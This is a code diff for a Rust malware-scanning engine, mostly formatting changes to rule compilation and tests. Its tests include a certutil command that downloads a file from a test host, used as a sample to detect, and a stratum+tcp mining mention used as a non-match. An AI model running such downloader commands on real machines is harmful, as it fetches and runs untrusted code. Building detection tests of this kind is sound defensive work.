@@ -194,9 +194,9 @@ impl Engine {
                 kam_core::Error::Refused(format!("rule globals could not be declared: {error}"))
             })?;
 
-        compiler
-            .add_source(BUNDLED)
-            .map_err(|error| kam_core::Error::Refused(format!("bundled rules did not compile: {error}")))?;
+        compiler.add_source(BUNDLED).map_err(|error| {
+            kam_core::Error::Refused(format!("bundled rules did not compile: {error}"))
+        })?;
 
         // Remember which identifiers are ours, so the interface can tell the
         // reader whether a match came from this product or from a rule they
@@ -222,8 +222,9 @@ impl Engine {
                             path.display()
                         )),
                     },
-                    Err(error) => problems
-                        .push(format!("{} could not be read: {error}", path.display())),
+                    Err(error) => {
+                        problems.push(format!("{} could not be read: {error}", path.display()))
+                    }
                 }
             }
         }
@@ -270,7 +271,10 @@ impl Engine {
             .map(|extension| extension.to_string_lossy().to_lowercase())
             .unwrap_or_default();
 
-        let _ = scanner.set_global("kam_script", SCRIPT_EXTENSIONS.contains(&extension.as_str()));
+        let _ = scanner.set_global(
+            "kam_script",
+            SCRIPT_EXTENSIONS.contains(&extension.as_str()),
+        );
         let _ = scanner.set_global("kam_ext", extension.as_str());
 
         let results = scanner.scan(&data).ok()?;
@@ -375,11 +379,7 @@ fn rule_names(source: &str) -> Vec<String> {
         .lines()
         .filter_map(|line| {
             let rest = line.trim().strip_prefix("rule ")?;
-            let name = rest
-                .split_whitespace()
-                .next()?
-                .trim_end_matches('{')
-                .trim();
+            let name = rest.split_whitespace().next()?.trim_end_matches('{').trim();
             (!name.is_empty()).then(|| name.to_owned())
         })
         .collect()
@@ -461,7 +461,10 @@ mod tests {
         // The rule requires two independent markers precisely so that a
         // blocklist, a document, or a security tool mentioning mining once
         // does not trip it.
-        let path = sample("mention.cmd", b"Our firewall blocks stratum+tcp:// connections.");
+        let path = sample(
+            "mention.cmd",
+            b"Our firewall blocks stratum+tcp:// connections.",
+        );
         assert!(
             !scan_one(&engine(), &path).contains(&"cryptocurrency_miner".to_owned()),
             "one mention should not be enough"
@@ -501,7 +504,10 @@ mod tests {
 
     #[test]
     fn certutil_used_as_a_downloader_is_recognised() {
-        let path = sample("certutil.bat", b"certutil -urlcache -split -f http://example.test/a.bin");
+        let path = sample(
+            "certutil.bat",
+            b"certutil -urlcache -split -f http://example.test/a.bin",
+        );
         assert!(scan_one(&engine(), &path).contains(&"downloads_and_executes".to_owned()));
         std::fs::remove_file(&path).unwrap();
     }
@@ -583,7 +589,9 @@ mod tests {
         for root in [
             std::env::var("ProgramFiles").ok(),
             std::env::var("ProgramFiles(x86)").ok(),
-            std::env::var("USERPROFILE").ok().map(|p| format!("{p}\\Downloads")),
+            std::env::var("USERPROFILE")
+                .ok()
+                .map(|p| format!("{p}\\Downloads")),
         ]
         .into_iter()
         .flatten()
@@ -626,7 +634,11 @@ mod tests {
                 "  [{}] {} -- {} ({})",
                 hit.highest().label(),
                 hit.path,
-                hit.matches.iter().map(|m| m.rule.as_str()).collect::<Vec<_>>().join(", "),
+                hit.matches
+                    .iter()
+                    .map(|m| m.rule.as_str())
+                    .collect::<Vec<_>>()
+                    .join(", "),
                 hit.matches
                     .iter()
                     .flat_map(|m| m.evidence.iter())
